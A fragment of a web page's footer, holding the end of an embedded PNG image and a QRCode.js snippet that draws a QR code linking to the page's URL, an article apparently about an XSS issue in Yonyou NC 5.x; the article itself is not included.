JFYfBF+5PlcfhzWIOsBU+7TSiJMEaF445t7nEbp19ZmraL1yTx1Ibbzz8xNYKT8+kNlbAPHmWRP6ISE0wFT7Ig20t7eJT070LIraVmtF5ZxDPJPXQnkVyvuA8ENi9fz4QOpmO398Ansgj8/opY5hILpqq/jq00FczVrn/jPOmrDqysU5tP5KuA7ieWD+GwMI/VFvOPfBqMHIzfYYBjIzbe51J9AGAjFBuIarR/TbKLRPuQNiD2tCCA4Sez+kphoFJAeRi+8DQnNPYe/RWrxCeR8QPYAmyasAhm84YORaYUlU72gDKfpO33gCeyBvPPzZ1v8DAAD///6QYLIAAAAGSURBVAMAEDqmthXYUWEAAAAASUVORK5CYII=)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc5x-xss.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 